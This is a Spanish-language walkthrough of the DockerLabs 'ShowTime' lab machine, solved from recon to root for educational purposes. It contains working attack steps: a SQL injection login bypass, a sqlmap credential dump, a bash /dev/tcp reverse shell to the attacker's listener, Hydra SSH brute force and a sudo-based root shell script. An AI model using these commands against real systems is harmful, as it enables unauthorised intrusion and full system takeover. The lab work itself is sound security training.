## Introducción

Este documento presenta la resolución completa de la máquina **ShowTime**, desarrollada por *maciiii___* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web con un formulario de login vulnerable a **SQL Injection**, permitiendo el bypass de autenticación y la extracción de credenciales de la base de datos. Con estas credenciales, se accede a un panel administrativo que permite ejecutar código Python, facilitando una reverse shell como `www-data`.
Una vez dentro, se encuentra un archivo en `/tmp` con un diccionario de contraseñas que permite acceder al sistema vía SSH como el usuario `joe`. Desde allí, se abusa de configuraciones inseguras de `sudo` para moverse al usuario `luciano` y finalmente ejecutar un script como root para obtener acceso completo al sistema.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip ShowTime.zip
sudo bash auto_deploy.sh ShowTime.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p ShowTime/{content,exploits,nmap,scripts}
cd ShowTime
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1761626675/Ports_vimq0z.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt,js -t 200
```

**Rutas encontradas:**
- `/index.php` — Página principal.

## Paso 2 — Explotación (Acceso inicial)

### 2.1 SQL Injection

Se prueba una comilla simple (`'`) en el formulario, obteniendo un error SQL:

![Test SQLi](https://res.cloudinary.com/dewqswzke/image/upload/v1761626679/TestSqli_ex9vpy.png)

Se realiza un bypass clásico:

```
Usuario: admin
Contraseña: ' or 1=1-- -
```

Se accede a una página administrativa:

![Home Admin](https://res.cloudinary.com/dewqswzke/image/upload/v1761626674/HomeAdmin_uvqgdn.png)

### 2.2 Extracción de datos con SQLMap

Se utiliza `sqlmap` para extraer credenciales:

```bash
sqlmap -u "http://172.17.0.2/index.php" --forms --batch -D users --dump
```

![Users](https://res.cloudinary.com/dewqswzke/image/upload/v1761626679/UsersDatabase_tuto6l.png)

Se obtienen credenciales del usuario `joe` y se accede al panel.

### 2.3 Ejecución remota de comandos

El panel permite ejecutar código Python. Se prueba un comando:

```python
import os
os.system("ls")
```

![CI](https://res.cloudinary.com/dewqswzke/image/upload/v1761626674/CI_vththv.png)

Se inicia un listener en la máquina atacante:

```bash
nc -nlvp 443
```

Se ejecuta el payload para la reverse shell:

```python
import os
os.system("bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'")
```

![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1761626676/ReverseShell_dy0fz1.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → joe

En `/tmp` se encuentra `.hidden_text.txt` con un diccionario de contraseñas:

![Hidden text](https://res.cloudinary.com/dewqswzke/image/upload/v1761626675/Hydra_wqo9lj.png)

Se utiliza Hydra para fuerza bruta SSH con el diccionario:

```bash
hydra -l joe -P /tmp/.hidden_text.txt ssh://172.17.0.2
```

![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1761626677/SSH_tju3qp.png)

### 3.2 De joe → luciano

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1761626677/Sudo-l_rwcecp.png)

Se puede ejecutar `/bin/posh` como `luciano`:

```bash
sudo -u luciano /bin/posh
```

### 3.3 De luciano → root

Se verifican los permisos sudo de `luciano`:

```bash
sudo -l
```

![Sudo -l 2](https://res.cloudinary.com/dewqswzke/image/upload/v1761626678/Sudo-l2_rs2uaa.png)

Se puede ejecutar un script como root. Se crea un script malicioso:

```bash
echo '#!/bin/bash\n/bin/bash -p' > /tmp/script.sh
chmod +x /tmp/script.sh
```

Se ejecuta:

```bash
sudo /tmp/script.sh
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1761626677/Root_huz9ww.png)
